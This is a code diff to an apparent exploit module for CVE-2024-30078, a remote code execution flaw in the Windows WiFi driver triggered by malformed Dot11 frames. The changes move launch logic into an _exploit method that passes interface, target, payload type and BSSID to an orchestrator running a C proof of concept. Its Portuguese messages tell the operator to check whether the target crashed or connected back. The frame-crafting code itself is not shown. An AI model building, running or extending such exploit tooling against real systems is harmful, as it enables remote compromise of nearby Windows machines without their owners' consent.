@@ -133,17 +133,22 @@ class Cve202430078WindowsWifiDriver(Exploit):
         if not gw.run():
             return
 
+        print("[+] Pre-conditions satisfied; launching exploit ...")
+        self._exploit()
+
+    def _exploit(self) -> None:
+        """E2E exploit: Windows WiFi driver RCE via malformed Dot11 frames."""
+        orch = PolyglotOrchestrator()
         target = str(self.RHOST.value).upper()
         iface  = str(self.INTERFACE.value)
         ptype  = str(self.PAYLOAD_TYPE.value).lower()
 
-        print(f"[*] CVE-2024-30078 → alvo: {target} | iface: {iface} | payload: {ptype}")
+        print(f"[*] CVE-2024-30078 -> alvo: {target} | iface: {iface} | payload: {ptype}")
 
         if ptype == "check":
             self._mode_check(target, iface)
             return
 
-        # Executa PoC em C via orquestrador
         args = [iface, target, ptype]
         if str(self.BSSID.value):
             args.append(str(self.BSSID.value))
@@ -161,7 +166,7 @@ class Cve202430078WindowsWifiDriver(Exploit):
         if result.success:
             print("[+] PoC executado. Verifique se o target travou ou conectou de volta.")
         else:
-            print(f"[!] Código de retorno: {result.returncode}")
+            print(f"[!] Codigo de retorno: {result.returncode}")
 
     # ------------------------------------------------------------------
     # Helpers
